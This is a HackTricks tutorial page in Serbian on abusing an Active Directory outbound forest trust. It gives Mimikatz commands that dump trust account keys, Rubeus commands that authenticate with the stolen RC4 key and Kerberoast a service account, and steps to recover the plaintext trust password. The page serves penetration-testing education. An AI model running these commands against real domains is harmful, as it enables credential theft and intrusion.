# Eksterni Forest Domen - Jednosmerno (Izlazno)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

U ovom scenariju **vaš domen** **priznaje** neke **privilegije** glavnom iz **drugih domena**.

## Enumeracija

### Izlazno poverenje
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Postoji sigurnosna ranjivost kada se uspostavi odnos poverenja između dva domena, ovde identifikovana kao domen **A** i domen **B**, gde domen **B** proširuje svoje poverenje na domen **A**. U ovoj postavci, poseban nalog se kreira u domenu **A** za domen **B**, koji igra ključnu ulogu u procesu autentifikacije između dva domena. Ovaj nalog, povezan sa domenom **B**, koristi se za enkripciju karata za pristup uslugama između domena.

Ključni aspekt koji treba razumeti ovde je da se lozinka i hash ovog posebnog naloga mogu izvući iz Kontrolera domena u domenu **A** koristeći alat za komandnu liniju. Komanda za izvršavanje ove radnje je:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ova ekstrakcija je moguća jer je nalog, označen sa **$** nakon svog imena, aktivan i pripada grupi "Domain Users" domena **A**, čime nasleđuje dozvole povezane sa ovom grupom. To omogućava pojedincima da se autentifikuju protiv domena **A** koristeći akreditive ovog naloga.

**Warning:** Moguće je iskoristiti ovu situaciju da se dobije pristup u domen **A** kao korisnik, iako sa ograničenim dozvolama. Međutim, ovaj pristup je dovoljan za izvođenje enumeracije na domenu **A**.

U scenariju gde je `ext.local` poveravajući domen, a `root.local` povereni domen, korisnički nalog nazvan `EXT$` biće kreiran unutar `root.local`. Kroz specifične alate, moguće je izvući Kerberos ključeve poverenja, otkrivajući akreditive `EXT$` u `root.local`. Komanda za postizanje ovoga je:
```bash
lsadump::trust /patch
```
Следећи ово, могло би се користити извучени RC4 кључ за аутентификацију као `root.local\EXT$` унутар `root.local` користећи команду другог алата:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ovaj korak autentifikacije otvara mogućnost za enumeraciju i čak eksploataciju usluga unutar `root.local`, kao što je izvođenje Kerberoast napada za ekstrakciju kredencijala servisnog naloga koristeći:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Prikupljanje lozinke poverenja u čistom tekstu

U prethodnom toku korišćen je hash poverenja umesto **lozinke u čistom tekstu** (koja je takođe **izvučena pomoću mimikatz**).

Lozinka u čistom tekstu može se dobiti konvertovanjem \[ CLEAR ] izlaza iz mimikatz iz heksadecimalnog formata i uklanjanjem null bajtova ‘\x00’:

![](<../../.gitbook/assets/image (938).png>)

Ponekad, prilikom kreiranja odnosa poverenja, korisnik mora da unese lozinku za poverenje. U ovoj demonstraciji, ključ je originalna lozinka poverenja i stoga je čitljiva za ljude. Kako se ključ menja (svakih 30 dana), lozinka u čistom tekstu neće biti čitljiva za ljude, ali će tehnički i dalje biti upotrebljiva.

Lozinka u čistom tekstu može se koristiti za obavljanje redovne autentifikacije kao račun poverenja, što je alternativa traženju TGT-a koristeći Kerberos tajni ključ računa poverenja. Ovde se upit vrši na root.local iz ext.local za članove Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Reference

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
